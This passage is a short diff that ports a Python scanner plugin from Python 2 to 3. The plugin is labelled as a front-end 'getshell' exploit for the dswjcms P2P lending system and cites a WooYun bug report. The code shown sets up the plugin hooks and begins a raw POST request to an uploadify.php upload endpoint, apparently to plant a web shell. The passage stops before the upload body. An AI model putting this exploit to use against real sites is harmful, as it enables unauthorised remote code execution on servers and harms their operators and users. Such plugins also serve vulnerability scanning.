@@ -3,12 +3,12 @@
 #__Author__ = P4NY
 #_PlugName_ = 某P2P网贷系统(dswjcms)前台getshell
 #__Refer___ = http://wooyun.org/bugs/wooyun-2015-0141209
-import re,urlparse
+import re,urllib.parse
 def assign(service, arg):
     if service == 'dswjcms':
         return True, arg
 def audit(arg):
-    p=urlparse.urlparse(arg)
+    p=urllib.parse.urlparse(arg)
     raw="""POST /Public/uploadify/uploadify.php HTTP/1.1
 Host: {netloc}
 User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:34.0) Gecko/20100101 Firefox/34.0
